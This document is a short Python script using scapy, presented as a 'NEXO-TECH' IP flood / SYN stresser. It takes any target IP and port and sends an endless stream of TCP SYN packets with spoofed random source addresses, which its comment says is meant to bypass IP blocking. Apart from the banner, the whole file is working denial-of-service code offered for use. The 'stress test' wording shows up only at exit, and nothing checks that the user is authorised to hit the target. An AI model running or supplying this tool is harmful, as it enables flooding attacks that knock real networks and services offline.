import os
import sys
import random
from scapy.all import *

# --- NEXO-TECH COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{R}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{R}======================================================={W}")
    print(f"{Y}  MODULE:      {W}IP FLOOD / SYN STRESSER")
    print(f"{Y}  TARGET:      {R}NETWORK SATURATION{W}")
    print(f"{R}======================================================={W}\n")

def nexo_flood(target_ip, target_port):
    print(f"{R}[!] NEXO-TECH CRITICAL: STARTING FLOOD...{W}")
    print(f"{G}[+] Target IP:   {W}{target_ip}")
    print(f"{G}[+] Target Port: {W}{target_port}")
    print(f"{C}[*] Status:      {R}SENDING CORRUPT PACKETS...{W}")
    
    packet_count = 0
    try:
        while True:
            # Generate a random Source IP to bypass basic IP blocking
            src_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            
            # Craft the SYN Packet
            # IP layer handles the routing, TCP layer handles the "connection" request
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            
            # Send the packet (No verbose to increase speed)
            send(ip_layer/tcp_layer, verbose=0)
            
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"{Y}[*] Packets Injected: {W}{packet_count}", end='\r')
                
    except KeyboardInterrupt:
        print(f"\n\n{G}[+] Stress Test Completed. Total Packets: {packet_count}{W}")

if __name__ == "__main__":
    show_banner()
    
    target = input(f"{Y}[+] Enter Target IP: {W}")
    port = int(input(f"{Y}[+] Enter Target Port (e.g. 80, 443): {W}"))
    
    show_banner()
    nexo_flood(target, port)
